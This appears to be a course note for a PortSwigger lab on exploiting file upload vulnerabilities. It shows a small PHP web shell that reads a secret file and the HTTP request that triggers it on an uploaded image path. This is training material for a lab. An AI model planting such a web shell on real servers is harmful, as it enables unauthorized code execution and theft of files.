---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## Exfiltrating the Secret File

Once the PHP web shell is uploaded and accessible, you can use it to exfiltrate the contents of the secret file `/home/Carlos/secret`.

### Using the Web Shell

To exfiltrate the secret file, you can modify the PHP code in the web shell to read the contents of the file and output it:

```php
<?php
$secret = file_get_contents('/home/Carlos/secret');
echo $secret;
?>
```

### Accessing the Web Shell

Access the web shell via a web browser or using a tool like `curl`:

```http
GET /uploads/test.png HTTP/1.1
Host: vulnerable-app.example.com
```

If the PHP code is executed, you should see the contents of the secret file in the response.

### Submitting the Secret

Once you have exfiltrated the secret file, submit the secret using the button provided in the lab banner.

---
<!-- nav -->
[[Web Security (PortSwigger)/18-File Upload Vulnerabilities/07-Lab 6 Remote code execution via polyglot web shell upload/02-Lab Setup and Overview|Lab Setup and Overview]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/07-Lab 6 Remote code execution via polyglot web shell upload/00-Overview|Overview]] | [[04-File Upload Vulnerabilities and Polyglot Web Shells|File Upload Vulnerabilities and Polyglot Web Shells]]
